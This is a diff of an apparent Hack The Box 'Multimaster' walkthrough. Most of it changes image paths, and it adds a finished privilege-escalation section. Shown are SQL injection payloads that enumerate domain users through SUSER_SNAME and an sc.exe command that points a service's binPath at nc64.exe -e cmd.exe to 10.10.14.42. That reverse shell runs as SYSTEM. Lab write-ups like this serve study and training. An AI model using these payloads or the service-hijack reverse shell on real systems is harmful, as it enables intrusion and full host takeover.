@@ -117,25 +117,25 @@ SMB does not allow us to access anything without credentials for this machine.&#
 
 Port 80 shows us a dashboard of some sorts:
 
-<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
 
 There were some functions, and the one that stood out was the 'Colleague Finder', which took one name parameter.
 
-<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
 
 If nothing is entered, then all the employees are returned.
 
-<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
 We can take note of these usernames for later. More importantly, we should see how this thing processes queries. When viewed in Burpsuite, the request simply sent a POST request to `/api/getColleagues` and it returns a response.
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
 This looks vulnerable to SQL Injection somehow. Every form of injection I tried resulted in a 403 being returned. I noticed one thing however, the `Content-Type` header said that this app accepts UTF-8 characters.&#x20;
 
 UTF-8 characters are a bit special as they are denoted like `\u12` or something. If I try to use `\u12` as the input, I get an error instead of being blocked.
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
 This likely indicates that our query has caused a backend error. Using this, we can try some of the `sqlmap` tampers that are available:
 
@@ -351,7 +351,7 @@ I used this site to encode it into a suitable UTF-8 format:
 
 Testing it worked!
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
 
 We can then try to enumerate the Administrator user using this payload:
 
@@ -363,7 +363,7 @@ a' union select 1,1,1,1,(select sys.fn_varbintohexstr(SUSER_SID('megacorp\Admini
 
 This would result in some hex being returned:
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
 
 We can use this to send another query that would return usernames and convert the SID for us.&#x20;
 
@@ -373,7 +373,7 @@ a' union select 1,1,1,1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492b
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
 
 Now, we just need a way to automate this method. I took the two functions used to convert the hex to a valid SID from the user earlier.
 
@@ -390,7 +390,7 @@ a' union select 1,1,1,1,(SUSER_SNAME(SID_BINARY('S-1-5-21-3167813660-1240564177-
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
 
 This is the final script I used to automate this method:
 
@@ -506,7 +506,7 @@ SMB         megacorp.local  445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikika
 
 I was then able to `evil-winrm` in as this user:
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -618,13 +618,13 @@ Start Bloodhound and upload the information as usual. Then, we can check each us
 
 First, we find that `cyork` is part of the Developers group:
 
-<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
 
 There are no outbound object controls for this, indicating that this group might have access to somestuff on the machine.&#x20;
 
 We can also find that the `sbauer` user has some privileges over `jorden`.
 
-<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 
 The rest of the users don't have anything interesting about them. I also used `PrivescCheck.ps1` to enumerate for me since WinPEAS was not working for some reason. Here was the interesting output:
 
@@ -760,7 +760,7 @@ This exploit was weird, as it took me ages to get a shell, but I eventually did.
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 
 ### Inetpub DLL --> Credentials
 
@@ -898,7 +898,7 @@ The `Web.Config` file doesn't seem to use it, making it weirder. I downloaded th
 
 Within it, we can find some hardcoded credentials:
 
-<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
 
 Since we have access to the `C:\Users` directory, we can check which user is this password valid with, and `sbauer` is the one!
 
@@ -910,15 +910,13 @@ SMB         megacorp.local  445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3
 
 We can then `evil-winrm` in as this user:
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
-
-Great!&#x20;
+<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
 
 ### GenericWrite --> Jorden Shell
 
 From the Bloodhond we did earlier, we can see that this user has `GenericWrite` privileges over `jorden`:
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
 
 To exploit this, we can use PowerView.ps1. However, it seems AMSI is blocking us:
 
@@ -1001,7 +999,7 @@ Session completed.
 
 <figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
-### Excessive Privileges --> Root(?)
+### Excessive Privileges --> Root
 
 `jorden` has loads of privileges available and is part of a lot of groups:
 
@@ -1050,6 +1048,70 @@ Local Group Memberships      *Remote Management Use*Server Operators
 Global Group memberships     *Domain Users         *Developers
 ```
 
-Technically, SeBackupPrivilege allows us to read the `root.txt` directly, but getting an admin shell is of course better.&#x20;
+Technically, SeBackupPrivilege allows us to read the `root.txt` directly, but getting an admin shell is of course better. So since we are part of the Server Operators group, we can start our enumeration from there.&#x20;
 
-WIP.
+From Hacktricks, I gathered that the Server Operators group was able to do these:
+
+* Allow log on locally
+* Back up files and directories
+* [`SeBackupPrivilege`](broken-reference) and [`SeRestorePrivilege`](broken-reference)
+* Change the system time
+* Change the time zone
+* Force shutdown from a remote system
+* Restore files and directories
+* Shut down the system
+* control local services
+
+All of these are not super interesting, except for the last one. We can control local services, meaning that we can do stuff like change service paths to run payloads as the SYSTEM user. As such, I used `PowerUp.ps1` to do my checks on what services I could manipulate.&#x20;
+
+This didn't work because it seems that we cannot access the Service Manager:
+
+```
+*Evil-WinRM* PS C:\> sc.exe query type= service
+[SC] OpenSCManager FAILED 5:
+
+Access is denied.
+```
+
+I couldn't run WinPEAS on the machine, so I used my own Windows host to find a service that we could edit, and this took a while.&#x20;
+
+We can find all the services using `reg query`:
+
+```
+*Evil-WinRM* PS C:\Users\jorden\Documents> reg query HKLM\system\currentcontrolset\services
+
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET CLR Data
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET CLR Networking
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET Data Provider for Oracle
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET Data Provider for SqlServer
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET Memory Cache 4.0
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NETFramework
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\1394ohci
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\3ware
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ACPI
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AcpiDev
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpiex
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpipagr
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AcpiPmi
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpitime
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADOVMPPackage
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADP80XX
+<TRUNCATED>
+```
+
+Within this huge list, there were loads of services that weren't valid to use because they were already running or I could not edit the `binPath` variable.&#x20;
+
+> Used 0xdf's writeup because I got lazy finding the service lol.&#x20;
+
+The first service I noticed were `browser` and `bowser`. I just thought the latter was funny, but the former was one that we could abuse.  First, we just need to change the `binpath` and then run  `start` to start it again. This gives us a `root` shell.&#x20;
+
+```
+*Evil-WinRM* PS C:\Windows\Tasks> sc.exe config browser binPath= "C:\Windows\Tasks\nc64.exe -e cmd.exe 10.10.14.42 443"
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Windows\Tasks> sc.exe start browser
+```
+
+<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+
+Rooted!&#x20;
